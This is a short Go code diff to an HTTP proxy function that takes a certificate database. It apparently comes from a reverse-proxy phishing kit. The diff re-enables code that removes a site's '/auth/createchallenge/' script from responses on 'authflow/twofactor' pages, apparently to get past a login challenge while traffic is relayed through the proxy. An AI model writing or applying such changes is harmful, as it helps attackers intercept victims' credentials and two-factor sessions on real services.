@@ -1159,10 +1159,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
 			}
 
-		       /*if strings.Contains(resp.Request.URL.Path, "authflow/twofactor") {
+		       if strings.Contains(resp.Request.URL.Path, "authflow/twofactor") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
-			}*/
+			}
 			
 			// Restore the modified or original body to the response
 			resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
